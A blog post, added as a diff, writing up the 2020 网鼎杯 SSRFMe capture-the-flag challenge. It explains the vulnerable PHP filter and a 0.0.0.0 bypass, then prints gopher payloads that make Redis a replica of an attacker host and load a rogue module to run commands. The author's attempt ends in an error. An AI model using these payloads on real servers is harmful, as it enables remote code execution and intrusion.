@@ -1,0 +1,180 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="suyumen"><meta name="renderer" content="webkit"><meta name="copyright" content="suyumen"><meta name="keywords" content="SUYUMEN"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>网鼎杯-2020-SSRFMe · SUYUMEN</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">suyumen</div><div class="profile-signature">目前主要在学习web相关</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/back.jpg);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">SUYUMEN</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">网鼎杯-2020-SSRFMe</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2021-07-26</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="ssrf"> ssrf</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">1.3k</span> | Reading time: <span class="post-count">6</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><hr>
+<p>没有做过<strong>ssrf</strong>的题，找一个了解一下。<br>直接给了源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        safe_request_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<hr>
+<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><pre><code>SSRF(Server-Side Request Forgery:服务器端请求伪造) 
+由攻击者构造形成由服务端发起请求的一个安全漏洞。
+一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。
+</code></pre>
+<hr>
+<p>这么一大堆不认识的函数，慢慢看吧：</p>
+<p>1.</p>
+<p><code>$int_ip=ip2long($ip);</code></p>
+<pre><code>函数 ip2long() : 返回 IPV4 网络地址的长整型格式，从标准网络地址格式(点字符串)转化得到。
+</code></pre>
+<p>其中转换的流程：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ip2int</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">list</span>(<span class="variable">$ip1</span>,<span class="variable">$ip2</span>,<span class="variable">$ip3</span>,<span class="variable">$ip4</span>)=explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span>(<span class="variable">$ip1</span>&lt;&lt;<span class="number">24</span>)|(<span class="variable">$ip2</span>&lt;&lt;<span class="number">16</span>)|(<span class="variable">$ip3</span>&lt;&lt;<span class="number">8</span>)|(<span class="variable">$ip4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<p><code>$url_parse=parse_url($url);</code></p>
+<pre><code>函数parse_url() : 解析 URL，返回其组成部分。不能用于相对 URL。不完整的 URL 也被接受，parse_url() 会尝试尽量正确地将其解析。
+</code></pre>
+<p>3.</p>
+<p><code>$ip=gethostbyname($hostname);  </code></p>
+<pre><code>函数gethostbyname() ：返回主机名 hostname 对应的 IPv4 互联网地址。
+</code></pre>
+<p><strong>function check_inner_ip</strong>这个函数相当于过滤掉了</p>
+<p><code>127.0.0.0</code></p>
+<p><code>10.0.0.0</code></p>
+<p><code>172.16.0.0</code></p>
+<p><code>192.168.0.0</code></p>
+<p>这几个地址，然后还需要让<code>url</code>是<strong>本地地址</strong>。</p>
+<p>用<code>?url=http://0.0.0.0/hint.php</code>读一下<code>hint.php</code></p>
+<hr>
+<p>得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p><code>redispass is root</code> –&gt; <code>redis</code> 的<code>password</code> 是 <code>root</code>~~~~</p>
+<p>查了一下<code>Redis</code>的漏洞：</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/143347985">https://zhuanlan.zhihu.com/p/143347985</a>这个里面有详细的复现过程。同时出现了许多新词儿……</p>
+<h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><pre><code>指将一台Redis服务器的数据，复制到其他的Redis服务器。
+前者称为主节点(master)，后者称为从节点(slave)；
+数据的复制是单向的，只能由主节点到从节点。
+</code></pre>
+<p>从节点开启主从复制的3个方式：</p>
+<p>1.在从服务器的配置文件中加入：</p>
+<p><code>slaveof &lt;masterip&gt; &lt;masterport&gt;</code></p>
+<p>2.<code>redis-server</code>启动命令后加入<code> --slaveof &lt;masterip&gt; &lt;masterport&gt;</code></p>
+<p>3.<code>Redis</code>服务器启动后，直接通过客户端执行命令<code>slaveof &lt;masterip&gt; &lt;masterport&gt;</code>，则该<code>Redis</code>实例成为从节点。</p>
+<p>然后用两个工具：（这是完全在跟着别人的wp做了……）<a target="_blank" rel="noopener" href="https://www.cnblogs.com/karsa/p/14123995.html#%E7%9F%A5%E8%AF%86%E7%82%B9">https://www.cnblogs.com/karsa/p/14123995.html#%E7%9F%A5%E8%AF%86%E7%82%B9</a></p>
+<p>1.<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">redis-rogue-server</a></p>
+<p>2.<a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">redis-ssrf</a></p>
+<p>小号开linux靶机,ssh连接,把这两个py文件和exp.so传至同一目录下：</p>
+<p><img src="https://github.com/suyumen/suyumen.github.io/blob/master/img/assets/2021728-1.jpg?raw=true" alt="1-1"></p>
+<p>修改<code>ssrf-redis.py</code>中的三处<br>1.125行左右：</p>
+<p><code>lhost</code>改成linux靶机的ip,<code>command</code>改成想要执行的命令。</p>
+<p>2.140行左右：<br><code>ip</code>改成<code>0.0.0.0</code>。</p>
+<p>3.160行左右：</p>
+<p><code>password</code>改成<code>root</code>。</p>
+<p><img src="https://github.com/suyumen/suyumen.github.io/blob/master/img/assets/2021728-2.jpg?raw=true" alt="1-2"></p>
+<p>在目录下运行：<br><code>python ssrf-redis.py</code>生成payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A3%0D%0A%247%0D%0ASLAVEOF%0D%0A%2414%0D%0A172.16.150.103%0D%0A%244%0D%0A6666%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%245%0D%0A/tmp/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%246%0D%0Aexp.so%0D%0A%2A3%0D%0A%246%0D%0AMODULE%0D%0A%244%0D%0ALOAD%0D%0A%2411%0D%0A/tmp/exp.so%0D%0A%2A2%0D%0A%2411%0D%0Asystem.exec%0D%0A%2414%0D%0Acat%24%7BIFS%7D/flag%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/suyumen/suyumen.github.io/blob/master/img/assets/2021728-3.jpg?raw=true" alt="1-3"></p>
+<p>二次url编码一下,由于<code>libcurl</code>传递的url也需要编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A%2F%2F0.0.0.0%3A6379%2F_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25244%250D%250Aroot%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A172.16.150.103%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2Ftmp%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2Ftmp%2Fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252414%250D%250Acat%2524%257BIFS%257D%2Fflag%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</span><br></pre></td></tr></table></figure>
+
+<p><code>python rogue-server.py</code></p>
+<p>有的wp用到了写个死循环<code>shell</code>脚本跑<code>rogue-server.py </code>，防止<code>exp.so</code>传输中断:</p>
+<p>打过去。</p>
+<p>好，报错了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(210) &quot;+OK +OK Already connected to specified master +OK +OK -ERR Error loading the extension. Please check the server logs. -ERR unknown command `system.exec`, with args beginning with: `cat$&#123;IFS&#125;/flag`, +OK &quot;</span><br></pre></td></tr></table></figure>
+
+<p>好饿，睡觉去了，，，这啥原因明天再看看吧，so hard for me…</p>
+<hr>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30135181/article/details/52734225">https://blog.csdn.net/qq_30135181/article/details/52734225</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kismetv/p/9236731.html">https://www.cnblogs.com/kismetv/p/9236731.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/260636.html">https://www.freebuf.com/articles/network/260636.html</a></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://suyumen.github.io">suyumen</a></p><p> <span>Link:  </span><a href="https://suyumen.github.io/2021/07/26/2021-07-26-[%E7%BD%91%E9%BC%8E%E6%9D%AF2020]SSRFMe/">https://suyumen.github.io/2021/07/26/2021-07-26-[%E7%BD%91%E9%BC%8E%E6%9D%AF2020]SSRFMe/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2021/07/30/2021-07-30-%5BZJCTF%202019%5DNiZhuanSiWei/" title="ZJCTF-2019-NiZhuanSiWei"><span>< PreviousPost</span><br><span class="prevTitle">ZJCTF-2019-NiZhuanSiWei</span></a><a class="nextSlogan" href="/2021/07/23/2021-07-23-%5BRCTF%202019%5DNextphp/" title="RCTF-2019-Nextphp"><span>NextPost ></span><br><span class="nextTitle">RCTF-2019-Nextphp</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by <span>Hexo</span></span><span> | theme <span>Cxo</span></span></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf"><span class="toc-number">1.</span> <span class="toc-text">ssrf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">主从复制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
